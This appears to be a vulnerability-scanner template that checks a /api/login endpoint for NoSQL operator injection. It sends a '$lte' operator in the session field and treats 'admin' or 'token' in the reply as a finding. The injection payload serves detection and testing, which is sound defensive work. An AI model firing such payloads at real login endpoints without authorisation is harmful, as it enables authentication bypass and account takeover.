id: nosql2-043
name: 'NoSQL $lte in session'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $lte accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"session":{"$lte":""},"extra":"x"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
          - 'token'
